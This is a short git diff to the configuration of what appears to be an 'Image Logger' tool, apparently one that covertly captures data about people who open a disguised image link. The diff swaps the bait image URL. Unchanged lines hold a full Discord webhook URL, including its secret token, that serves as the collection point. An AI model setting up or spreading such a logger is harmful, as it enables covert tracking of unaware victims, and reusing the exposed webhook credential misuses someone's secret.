@@ -10,7 +10,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1420412512419184751/lKlNWFrgNNVdv0ONhyF2dsex8dt2r7GznuDKAOxmE_OC-Ehk3eAlZAopqoemtSqtmL5Y",  # REPLACE WITH YOUR WEBHOOK
-    "image": "https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIyLTA0L2pvYjcyMS0wMzctdi5qcGc.jpg",
+    "image": "https://imgur.com/a/VVjvtZf",
     "imageArgument": True,
     # CUSTOMIZATION #
     "username": "Image Logger",
